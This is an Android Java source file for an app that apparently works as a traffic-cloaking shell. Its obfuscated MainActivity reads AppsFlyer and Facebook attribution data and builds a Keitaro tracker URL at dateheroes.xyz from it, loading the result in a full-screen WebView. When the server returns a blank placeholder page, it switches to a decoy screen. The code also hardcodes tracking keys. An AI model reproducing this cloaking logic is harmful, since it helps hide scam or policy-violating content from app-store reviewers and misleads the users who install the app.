package bom.tohellik.magerik;


import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieSyncManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;
import com.onesignal.OneSignal;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.tohellik.magerik.R;

import java.util.Map;

public class MainActivity extends AppCompatActivity {

    WebView webliue;
    WebSettings bemsetingos;
    PendingIntent pendingIntent;
    int baleromse;
    Yueisdf httpURLConnection;
    ProgressBar progressBar;
    private String urlhost = "";
    static NetworkInfo netInfo;

    private static final String AF_DEV_KEY = "GDqSaoJNiNSSqjxRx9j4Fd";
    private static final String ONESIGNAL_APP_ID = "4437b024-f926-4aca-94f7-11086ae2c9da";

    SharedPreferences mSettings;
    public static final String APP_PREFERENCES = "myurl";
    public static final String APP_PREFERENCES_URL = "url"; // имя кота
    String urlGo = "https://dateheroes.xyz/uleJksmI"; // ТУТ СВОЙ ПОТОК КЕЙТАРО
    SharedPreferences.Editor editor;

    public ValueCallback<Uri[]> uploadMessage;
    private ValueCallback<Uri> mUploadMessage;
    public static final int REQUEST_SELECT_FILE = 100;
    private final static int FILECHOOSER_RESULTCODE = 1;


    @SuppressLint("JavascriptInterface")
    @Override
    protected void onResume() {
        super.onResume();
        final View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
        decorView.setOnSystemUiVisibilityChangeListener
                (new View.OnSystemUiVisibilityChangeListener() {
                    @Override
                    public void onSystemUiVisibilityChange(int visibility) {
                        if ((visibility & View.SYSTEM_UI_FLAG_FULLSCREEN) == 0) {
                            decorView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
                        }
                    }
                });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
// Enable verbose OneSignal logging to debug issues if needed.
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);
        setContentView(R.layout.activity_main);
        progressBar = (ProgressBar) findViewById(R.id.progressBar);
       /// getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                ///WindowManager.LayoutParams.FLAG_FULLSCREEN);
        mSettings = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE);
        if(mSettings.contains(APP_PREFERENCES_URL)) {
            urlGo = mSettings.getString(APP_PREFERENCES_URL, "");
            Log.e("URL сохранённый",urlGo);
        }


        AppsFlyerConversionListener conversionListener = new AppsFlyerConversionListener() {

            @Override
            public void onConversionDataSuccess(Map<String, Object> conversionData) {
                for (String attrName : conversionData.keySet()) {
                    Log.d("LOG_TAG", "atribute: " + attrName + " = " + conversionData.get(attrName));
                }
                if (conversionData.get("af_status").equals("Non-organic")) {
                    String name = (String) conversionData.get("campaign");
                      String afData = "sub_id_3=" + name;
                      Nowist(afData);
                    return;
                } else {
                    String  afData = "sub_id_3=organik";
                    System.out.println("ablom"+afData);
                    Nowist(afData);
                    return;
                }
            }

            @Override
            public void onConversionDataFail(String errorMessage) {
                Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);
            }

            @Override
            public void onAppOpenAttribution(Map<String, String> attributionData) {

                for (String attrName : attributionData.keySet()) {
                    Log.d("LOG_TAG", "attribute: " + attrName + " = " + attributionData.get(attrName));
                }

            }

            @Override
            public void onAttributionFailure(String errorMessage) {
                Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
            }
        };




        Intent intent = getIntent();
//        String action = intent.getAction();
        Uri data = intent.getData();
        try {
            urlhost = data.getQuery();
            urlhost = "?" + urlhost;
        } catch (Exception e) {
            e.printStackTrace();
        }


        if(isOnline(this)) {
            AppsFlyerLib.getInstance().init(AF_DEV_KEY, conversionListener, this);
            AppsFlyerLib.getInstance().startTracking(this);
            FacebookSdk.setAutoInitEnabled(true);
            FacebookSdk.fullyInitialize();
            AppLinkData.fetchDeferredAppLinkData(this,
                    new AppLinkData.CompletionHandler() {
                        @Override
                        public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                            if (appLinkData != null) {
                                final String popitka2 = appLinkData.getTargetUri().getQuery();
                                urlhost = "?" + popitka2;

                            } else {

                                Log.i("DEBUG_FACEBOOK_SDK", "AppLinkData is Null");

                                final String popitka3 = AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext());
                                urlhost = "?sub_id_2=" + popitka3;
                                System.out.println("uspex");
                               
                            }
                        }
                    }
            );
        }
        else
        {
            onejese();
        }
    }





    public void Nowist(String afData)

    {

        final String urlLoads = urlGo + urlhost+"&"+afData;

        httpURLConnection = new Yueisdf();
        httpURLConnection.start();
        try {
            httpURLConnection.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        baleromse = httpURLConnection.intoservolus();

        if (baleromse != 404) {

            webliue = (WebView) findViewById (R.id.iueyqwsssf);

            webliue.post(new Runnable()
            {

                @Override
                public void run() {

                    bemsetingos = webliue.getSettings();
                    bemsetingos.setJavaScriptEnabled(true);
                    bemsetingos.setDomStorageEnabled(true);
                    bemsetingos.setBuiltInZoomControls(true);
                    bemsetingos.setSupportZoom(true);
                    bemsetingos.setDisplayZoomControls(false);
                    webliue.setInitialScale(1);
                    webliue.getSettings().setLoadWithOverviewMode(true);
                    webliue.getSettings().setUseWideViewPort(true);
                    webliue.setWebChromeClient(new MyWebChromeClient());
                    webliue.getSettings().setAllowContentAccess(true);
                    webliue.getSettings().setAllowFileAccess(true);
                    webliue.loadUrl(urlGo);
                    if (18 < Build.VERSION.SDK_INT )
                    {
                        webliue.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
                    }

                    if (Build.VERSION.SDK_INT >= 19)
                    {
                        webliue.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
                    }

                    webliue.loadUrl(urlLoads);

                    webliue.addJavascriptInterface(new melovsting(), "HTMLOUT");

                    webliue.setWebViewClient(new WebViewClient(){

                        public void onPageFinished(WebView view, String url) {
                            progressBar.setVisibility(ProgressBar.INVISIBLE);
                            view.loadUrl("javascript:window.HTMLOUT.showHTML('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
                            CookieSyncManager.getInstance().sync();
                            urlGo = webliue.getUrl();

                            editor = mSettings.edit();
                            editor.putString(APP_PREFERENCES_URL, urlGo);
                            editor.apply();

                        }

                        public void onPageStarted(WebView view, String url,
                                                  Bitmap favicon) {


                        }


                        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest request) {

                            return false;
                        }


                    });
                }
            });


        }
        else {
            onejese();
        }



    }

    public void onejese()
    {

        Intent intent = new Intent(this, GLjkjsdf.class);
        startActivity(intent);


    }

    class melovsting
    {

        @JavascriptInterface
        public void showHTML(String html_data) {
            Log.e("", " ======>  HTML Data : "+  html_data);
            if (html_data.compareToIgnoreCase("<html><head><style>body{margin:0}</style></head><body><!--contacts with us--></body></html>") == 0) {
                Log.e("", "Error 1");
                onejese();
            } else {
                Log.e("", "Error 2");

            }


        }

    }



    class MyWebChromeClient extends WebChromeClient {
        // For 3.0+ Devices (Start)
        // onActivityResult attached before constructor
        protected void openFileChooser(ValueCallback uploadMsg, String acceptType) {
            mUploadMessage = uploadMsg;
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("image/*");
            startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
        }


        // For Lollipop 5.0+ Devices
        @TargetApi(Build.VERSION_CODES.LOLLIPOP)
        public boolean onShowFileChooser(WebView mWebView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            if (uploadMessage != null) {
                uploadMessage.onReceiveValue(null);
                uploadMessage = null;
            }

            uploadMessage = filePathCallback;

            Intent intent = fileChooserParams.createIntent();
            try {
                startActivityForResult(intent, REQUEST_SELECT_FILE);
            } catch (ActivityNotFoundException e) {
                uploadMessage = null;
                Toast.makeText(MainActivity.this, "Cannot Open File Chooser", Toast.LENGTH_LONG).show();
                return false;
            }
            return true;
        }

        //For Android 4.1 magerik
        protected void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            mUploadMessage = uploadMsg;
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.addCategory(Intent.CATEGORY_OPENABLE);
            intent.setType("image/*");
            startActivityForResult(Intent.createChooser(intent, "File Chooser"), FILECHOOSER_RESULTCODE);
        }

        protected void openFileChooser(ValueCallback<Uri> uploadMsg) {
            mUploadMessage = uploadMsg;
            Intent i = new Intent(Intent.ACTION_GET_CONTENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("image/*");
            startActivityForResult(Intent.createChooser(i, "File Chooser"), FILECHOOSER_RESULTCODE);
        }
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent intent) {
        super.onActivityResult(requestCode, resultCode, intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode == REQUEST_SELECT_FILE) {
                if (uploadMessage == null)
                    return;
                uploadMessage.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(resultCode, intent));
                uploadMessage = null;
            }
        } else if (requestCode == FILECHOOSER_RESULTCODE) {
            if (null == mUploadMessage)
                return;
            // Use MainActivity.RESULT_OK if you're implementing WebView inside Fragment
            // Use RESULT_OK magerik if you're implementing WebView inside an Activity
            Uri result = intent == null || resultCode != RESULT_OK ? null : intent.getData();
            mUploadMessage.onReceiveValue(result);
            mUploadMessage = null;
        } else
            Toast.makeText(this, "Failed to Upload Image", Toast.LENGTH_LONG).show();
    }


    @Override
    public void onBackPressed() {
        if (webliue.canGoBack()) {
            webliue.goBack();
        } else {
            super.onBackPressed();
        }
    }


    public static boolean isOnline(Context context)
    {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        netInfo = cm.getActiveNetworkInfo();
        if (netInfo != null && netInfo.isConnectedOrConnecting())
        {
            return true;
        }
        return false;
    }




}
